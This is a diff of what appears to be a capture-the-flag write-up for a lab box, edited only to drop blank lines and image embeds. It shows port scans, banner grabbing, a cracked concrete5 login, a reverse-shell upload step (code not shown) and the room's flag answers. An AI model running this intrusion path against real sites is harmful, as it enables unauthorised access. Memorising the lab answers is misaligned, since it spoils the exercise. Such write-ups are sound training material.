@@ -139,8 +139,6 @@ Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 171.50 seconds
 
-
-
 ┌──(witty㉿kali)-[~/Downloads]
 └─$ nc 10.10.130.225 4019
 220 (vsFTPd 3.0.3)
@@ -154,7 +152,6 @@ SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3
 ┌──(witty㉿kali)-[~/Downloads]
 └─$ nc 10.10.130.225 5901
 RFB 003.008
-
 
 ┌──(witty㉿kali)-[~/Downloads]
 └─$ ftp 10.10.130.225 4019
@@ -347,7 +344,6 @@ Ctrl +shift +p preferences
 
 find http
 
-
 HTTP/1.1 200 OK
 Content-Type: text/html
 Content-Length: 68
@@ -355,7 +351,6 @@ Date: Thu, 18 Feb 2021 16:10:51 GMT
 Connection: keep-alive
 
 <HTML><HEAD><TITLE>Success</TITLE></HEAD><BODY>Success</BODY></HTML>
-
 
 ┌──(witty㉿kali)-[~/Downloads]
 └─$ curl http://10.10.154.35/ | head
@@ -372,9 +367,7 @@ Connection: keep-alive
 <meta http-equiv="content-type" content="text/html; charset=UTF-8"/>
 <meta name="generator" content="concrete5 - 8.5.2"/>
 
-
 http://10.10.51.105/concrete5/index.php/blog/linux-bloggerscom
-
 
 Linux-Bloggers.com
 Apr 9, 2021 Adam_Admin 
@@ -384,19 +377,15 @@ http://10.10.51.105/concrete5/index.php/blog/neque-porro-quisquam
 Neque porro quisquam
 Apr 9, 2021 Benjamin_Blogger 
 
-
 http://10.10.51.105/concrete5/index.php/blog/ipsum
 
 Ipsum
 Apr 9, 2021 Lucy_Loser 
 
-
 http://10.10.51.105/concrete5/index.php/blog/lorem
-
 
 Lorem
 Apr 9, 2021 Donald_Dump 
-
 
 https://documentation.concretecms.org/user-guide/guided-tour/logging-in-and%20out
 
@@ -405,7 +394,6 @@ http://10.10.51.105/concrete5/index.php/login
 Donald_Dump: sandiago
 
 https://hackerone.com/reports/768322
-
 
 ┌──(witty㉿kali)-[~]
 └─$ cat revshell.php 
@@ -420,8 +408,6 @@ flv, jpg, gif, jpeg, ico, docx, xla, png, psd, swf, doc, txt, xls, xlsx, csv, pd
 http://superspam.thm/concrete5/index.php/dashboard/files/search
 
 upload revshell
-
-
 
 URL to File
 
@@ -544,7 +530,6 @@ pic1_name=input("[-] Enter First Image: " )
 pic2_name=input("[-] Enter Second Image: ")
 out_name=input("[-] Enter Name of The output image:")
 
-
 pic1=Image.open(pic1_name)
 print("[+] Reading pic1")  #finding the size of picture1 
 pic2=Image.open(pic2_name)
@@ -602,7 +587,6 @@ Let this flag of windows stand strongly against the wind for all to see. A pure 
 www-data@super-spam:/home/lucy_loser$ python3 -m http.server 8000
 python3 -m http.server 8000
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-
 
 www-data@super-spam:/home/lucy_loser$ python3 -m http.server 8000
 python3 -m http.server 8000
@@ -1108,15 +1092,6 @@ flag{iteeKdbu==hjK6§YuUu7-6N_}
 
 ```
 
-![[Pasted image 20230706175407.png]]
-
-![[Pasted image 20230705195355.png]]
-
-![[Pasted image 20230705195434.png]]
-![[Pasted image 20230706175801.png]]
-![[Pasted image 20230706184647.png]]
-![[Pasted image 20230706191048.png]]
-
 What CMS and version is being used? (format: wordpress x.x.x)  
 
 *concrete5 8.5.2*
@@ -1136,6 +1111,5 @@ What key information was embedded in one of super-spam's encrypted messages?
 What is the root flag?
 
 *flag{iteeKdbu==hjK6§YuUu7-6N_} *
-
 
 [[Annie]]
